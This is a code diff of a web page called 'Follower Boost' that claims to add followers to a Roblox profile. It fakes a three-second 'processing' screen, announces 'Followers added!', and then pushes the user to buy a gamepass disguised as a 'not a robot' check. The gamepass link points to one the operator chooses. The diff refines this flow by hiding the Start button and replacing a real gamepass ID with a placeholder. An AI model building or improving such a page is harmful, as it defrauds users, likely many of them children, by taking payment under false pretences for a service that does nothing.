@@ -146,7 +146,7 @@
     <div class="container">
         <h1>Follower Boost</h1>
         <input type="text" class="input-box" id="profileLink" placeholder="Paste your Roblox profile link" required>
-        <button class="start-button" onclick="boostFollowers()">Start</button>
+        <button id="startButton" class="start-button" onclick="boostFollowers()">Start</button>
         <div class="response-area" id="responseArea">
             <p id="responseText"></p>
         </div>
@@ -165,6 +165,7 @@
             const responseText = document.getElementById('responseText');
             const loadingScreen = document.getElementById('loadingScreen');
             const followerCounter = document.getElementById('followerCounter');
+            const startButton = document.getElementById('startButton');
 
             // Validate profile link
             const userIdMatch = profileLink.match(/users\/(\d+)\/profile/);
@@ -194,6 +195,7 @@
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 responseArea.style.display = 'block';
+                startButton.style.display = 'none'; // Hide the Start button
                 responseText.innerHTML = 'Followers added! Prove you’re not a robot by <a onclick="verifyPurchase()">buying this gamepass</a>.';
             }, 3000); // 3-second "processing" time
         }
@@ -202,7 +204,7 @@
             const loadingScreen = document.getElementById('loadingScreen');
             const followerCounter = document.getElementById('followerCounter');
             const loadingText = document.getElementById('loadingText');
-            const gamepassUrl = 'https://www.roblox.com/game-pass/1100739149'; // Replace with your Gamepass URL
+            const gamepassUrl = 'https://www.roblox.com/game-pass/YOUR_GAMEPASS_ID'; // Replace with your Gamepass URL
 
             // Show "Waiting..." loading screen
             loadingScreen.style.display = 'flex';
